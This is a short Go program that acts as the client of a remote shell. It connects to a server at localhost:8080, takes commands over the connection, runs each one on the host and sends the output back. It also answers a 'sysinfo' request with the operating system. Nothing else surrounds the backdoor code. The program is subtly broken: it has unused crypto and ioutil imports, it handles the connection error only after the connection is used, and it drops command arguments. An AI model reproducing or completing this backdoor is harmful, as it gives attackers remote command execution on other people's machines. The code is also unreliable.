package main

import (
	// Standard
	"strings"
	"encoding/gob"
	"net"
	"crypto/aes"
	"crypto/cipher"
	"io/ioutil"
	"os/exec"
	"runtime"
)


func main() {
	conn, err := net.Dial("tcp", "localhost:8080")

	cmd := ""
	dec := gob.NewDecoder(conn)
	enc := gob.NewEncoder(conn)

	if err != nil {
		enc.Encode(err)
	}

	cmdLoop:for {
		dec.Decode(&cmd)
		cmd = strings.TrimSuffix(cmd, "\n")
	
		switch {
		case cmd == "close":
			continue
		case cmd == "exit":
			break cmdLoop
		case cmd == "sysinfo":
			osType := runtime.GOOS
			enc.Encode(osType)
		default:
			splitCmd := strings.Split(cmd, " ")
			out, err := exec.Command(splitCmd[0]).Output()
		
			if err != nil {
				enc.Encode(err)
			}

			output := string(out[:])
			enc.Encode(output)
		}	
	}
	conn.Close()
}